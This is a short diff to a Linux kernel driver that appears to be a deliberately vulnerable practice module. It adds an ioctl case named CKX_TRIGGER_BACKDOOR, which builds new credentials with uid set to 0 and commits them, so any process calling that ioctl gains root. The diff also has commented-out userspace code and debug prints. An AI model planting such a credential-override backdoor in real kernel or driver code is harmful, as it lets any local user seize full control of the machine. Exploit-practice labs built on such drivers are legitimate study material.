@@ -7,6 +7,9 @@
 #include <linux/ioctl.h>
 #include <linux/uaccess.h>
 
+// #include<sys/types.h>
+// #include<unistd.h>
+
 #include "vuln_driver.h"
 #include "buffer_overflow.h"
 #include "null_pointer_deref.h"
@@ -108,6 +111,27 @@ static long do_ioctl(struct file *filp, unsigned int cmd, unsigned long args)
 			
 			use_stack_obj(&use_obj_arg);
 	
+			break;
+		}
+		case CKX_TRIGGER_BACKDOOR:
+		{
+			struct cred *mycred = current_cred();
+
+			printk("[@]the current uid is %d\n",mycred->uid);
+
+			kuid_t rootid=KUIDT_INIT(0);
+			mycred = prepare_creds();
+
+			mycred->uid=rootid;
+			commit_creds(mycred);
+
+			// return -EINVAL;
+			// setuid(0);
+			// current_uid=0;
+
+			printk("[@]now current uid is %d\n",mycred->uid);
+
+			ret=1234;
 			break;
 		}
 	}
